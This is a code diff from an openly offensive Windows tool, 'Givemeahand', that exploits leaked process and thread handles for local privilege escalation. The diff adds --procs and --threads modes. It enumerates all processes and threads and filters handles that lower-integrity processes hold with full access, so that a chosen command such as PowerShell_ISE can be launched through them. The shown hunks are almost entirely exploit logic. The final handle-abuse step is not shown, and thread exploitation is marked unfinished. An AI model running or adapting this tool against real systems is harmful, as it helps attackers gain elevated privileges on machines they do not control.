@@ -45,8 +45,8 @@ void PrintUsage()
 		"\thttp://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/\n"
 		"\n"
 		"Example usage:\n"
-		"\t.\\Givemeahand\n"
-		"\t.\\Givemeahand --cmd \"C:\\Windows\\System32\\cmd.exe /c calc.exe\"\n";
+		"\t.\\Givemeahand --threads (work in progress)\n"
+		"\t.\\Givemeahand --procs --cmd \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe\"\n";
 }
 
 int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
@@ -56,6 +56,16 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 	if (args.count(L"-h") || args.count(L"--help")) {
 		PrintUsage();
 		return 0;
+	}
+
+	if (args.count(L"--procs") && args.count(L"--threads")) {
+		cerr << "[-] You can only list/exploit one handle type at a time" << endl;
+		return 1;
+	}
+
+	if (!args.count(L"--procs") && args.count(L"--cmd")) {
+		cerr << "[-] --cmd requires --procs" << endl;
+		return 1;
 	}
 
 	NTSTATUS queryInfoStatus = 0;
@@ -72,47 +82,54 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 	THREADENTRY32 threadEntry = { 0 };
 	processEntry.dwSize = sizeof(PROCESSENTRY32W);
 	threadEntry.dwSize = sizeof(THREADENTRY32);
+	vector<DWORD> pids = {};
 
-	// start enumerating from the first process
-	auto status = Process32FirstW(snapshot.get(), &processEntry);
-
-	// start iterating through the PID space and try to open existing processes and map their PIDs to the returned shHandle
-	std::cout << "[*] Creating PIDs/TIDs->Handle map ...\n";
-	do
+	if (args.count(L"--procs"))
 	{
-		auto hTempHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, processEntry.th32ProcessID);
-		if (hTempHandle != NULL)
+		// start enumerating from the first process
+		auto status = Process32FirstW(snapshot.get(), &processEntry);
+		// start iterating through the PID space and try to open existing processes and map their PIDs to the returned shHandle
+		std::cout << "[*] Creating PIDs/TIDs->Handle map ...\n";
+		do
 		{
-			// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
-			mHandleId.insert({ hTempHandle, processEntry.th32ProcessID });
-		}
-		else {
-			if (args.count(L"--debug"))
-				cerr << "[.] Failed to open process "
-				<< processEntry.th32ProcessID
-				<< " (" << GetLastError() << ")\n";
-		}
-	} while (Process32NextW(snapshot.get(), &processEntry));
+			pids.push_back(processEntry.th32ProcessID);
+			auto hTempHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, processEntry.th32ProcessID);
+			if (hTempHandle != NULL)
+			{
+				// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
+				mHandleId.insert({ hTempHandle, processEntry.th32ProcessID });
+			}
+			else {
+				if (args.count(L"--debug"))
+					cerr << "[.] Failed to open process "
+					<< processEntry.th32ProcessID
+					<< " (" << GetLastError() << ")\n";
+			}
+		} while (Process32NextW(snapshot.get(), &processEntry));
+	}
 
-	// start enumerating from the first thread
-	// TODO: Implement thread handle exploitation
-	status = Thread32First(snapshot.get(), &threadEntry);
-	do
+	if (args.count(L"--threads"))
 	{
-		auto hTempHandle = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, threadEntry.th32ThreadID);
-		if (hTempHandle != NULL)
+		// start enumerating from the first thread
+		// TODO: Implement thread handle exploitation
+		auto status = Thread32First(snapshot.get(), &threadEntry);
+		do
 		{
-			// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
-			mHandleId.insert({ hTempHandle, threadEntry.th32OwnerProcessID });
-		}
-		else {
-			if (args.count(L"--debug"))
-				cerr << "[.] Failed to open thread " <<
-				threadEntry.th32OwnerProcessID
-				<< " (" << threadEntry.th32ThreadID << ") "
-				<< " [" << GetLastError() << "]\n";
-		}
-	} while (Thread32Next(snapshot.get(), &threadEntry));
+			auto hTempHandle = OpenThread(THREAD_QUERY_LIMITED_INFORMATION, FALSE, threadEntry.th32ThreadID);
+			if (hTempHandle != NULL)
+			{
+				// if we manage to open a shHandle to the process, insert it into the HANDLE - PID map at its PIDth index
+				mHandleId.insert({ hTempHandle, threadEntry.th32OwnerProcessID });
+			}
+			else {
+				if (args.count(L"--debug"))
+					cerr << "[.] Failed to open thread " <<
+					threadEntry.th32OwnerProcessID
+					<< " (" << threadEntry.th32ThreadID << ") "
+					<< " [" << GetLastError() << "]\n";
+			}
+		} while (Thread32Next(snapshot.get(), &threadEntry));
+	}
 
 	std::cout << "[*] Populating handleInfo ...\n";
 
@@ -177,8 +194,8 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 			integrityLevel < SECURITY_MANDATORY_HIGH_RID // the integrity level of the process must be < High
 			)
 		{
-			if (handle.ObjectTypeNumber != OB_TYPE_INDEX_PROCESS &&
-				handle.ObjectTypeNumber != OB_TYPE_INDEX_THREAD) continue;
+			if (((handle.ObjectTypeNumber != OB_TYPE_INDEX_PROCESS) && args.count(L"--procs")) ||
+				((handle.ObjectTypeNumber != OB_TYPE_INDEX_THREAD) && args.count(L"--threads"))) continue;
 
 			if (handle.ObjectTypeNumber == OB_TYPE_INDEX_PROCESS) {
 				if (!(handle.GrantedAccess == PROCESS_ALL_ACCESS ||
